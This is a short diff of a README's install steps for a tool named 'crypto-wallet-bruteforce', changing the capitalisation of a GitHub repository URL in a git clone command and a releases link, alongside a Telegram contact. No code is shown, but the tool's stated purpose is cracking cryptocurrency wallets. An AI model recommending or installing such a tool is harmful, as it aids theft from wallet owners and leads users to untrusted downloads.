@@ -45,13 +45,13 @@ https://www.python.org/
 
 2. After installation of python, clone the **crypto-wallet-bruteforce** using: 
 ```
-git clone https://github.com/xghost123/fhapdem.git
+git clone https://github.com/xghost123/Fhapdem.git
 ```
 
 `Note: Always look for latest release and use it.`
 ```
 https://t.me/xghost123
-https://github.com/xghost123/fhapdem/releases
+https://github.com/xghost123/Fhapdem/releases
 ```
 
 3. Go to the path you have clone the repository and hang on!
